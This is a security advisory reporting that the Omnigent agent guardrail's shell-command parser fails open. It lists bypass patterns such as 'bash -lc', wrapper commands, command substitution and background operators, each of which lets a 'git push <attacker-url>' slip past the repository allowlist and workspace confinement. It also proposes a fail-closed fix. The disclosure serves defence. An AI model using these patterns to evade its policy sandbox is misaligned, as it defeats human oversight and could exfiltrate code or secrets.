id: PYSEC-0000-omnigent-GHSA-7mqg-cx4g-x2rf
summary: 'Omnigent Guardrail policy bypass: shell-command parser fails open in policies/builtins/_shell.py'
details: "**Reporter:** Aaron / Aeon \u2014 autonomous security agent (https://github.com/aaronjmars/aeon)\n\
  **Project:** `omnigent-ai/omnigent` v0.1.0 (Databricks) \u2014 meta-harness running\
  \ Claude Code / Codex / Pi \"in check with policies and sandboxing\"\n**Component:**\
  \ `omnigent/policies/builtins/_shell.py` (shared parser) \u2192 consumed by `policies/builtins/github.py`\
  \ (`write_repos`/`write_branches` allowlist) and `policies/builtins/working_dir.py`\
  \ (workspace confinement)\n\n## Summary\n\nThe shared shell-command parser **fails\
  \ open**. When a gated command spells something the parser doesn't recognize, it\
  \ produces no operation, the policy evaluator returns `None`, and `None` = abstain\
  \ = **ALLOW**. So any command the parser misses bypasses both the GitHub repo/branch\
  \ allowlist and the working-directory confinement \u2014 the product's two core\
  \ safety guarantees.\n\n## Impact\n\nA misaligned or prompt-injected agent that\
  \ is *meant to be confined* can:\n\n- `git push` to an attacker-controlled repo\
  \ (code / secret exfiltration),\n- push to a protected branch,\n- escape its workspace\
  \ via `git worktree add` / `git -C <other-dir>`.\n\n## Bypass classes (all verified\
  \ against the real policy code)\n\n- **Combined interpreter flags:** `bash -lc \"\
  git push <attacker-url>\"`\n- **Unlisted wrappers:** `timeout` / `nice` / `setsid`\
  \ / `stdbuf \u2026 git push \u2026`\n- **Command substitution:** `x=$(git push <attacker-url>)`\n\
  - **Un-split background operator:** `true & git push <attacker-url>`\n\nControls\
  \ that **correctly hold** (confirming this is parser incompleteness, not an allowlist\
  \ logic error): bare `git push <attacker-url>` and `env git push \u2026` both **DENY**.\n\
  \n## Suggested fix\n\nMake the gated surface **fail closed**:\n\n1. An unrecognized\
  \ gated command must **DENY**, not return `None` \u2192 ALLOW. Abstain on a security\
  \ gate should resolve to deny, not allow.\n2. Canonicalize known wrappers (`timeout`\
  \ / `nice` / `setsid` / `stdbuf` / `env`) down to their inner command before evaluation.\n\
  3. Recurse into `sh -c` / `bash -c` payloads and command substitutions, and split\
  \ on shell control operators (`;`, `&`, `&&`, `||`, `|`) before judging each segment."
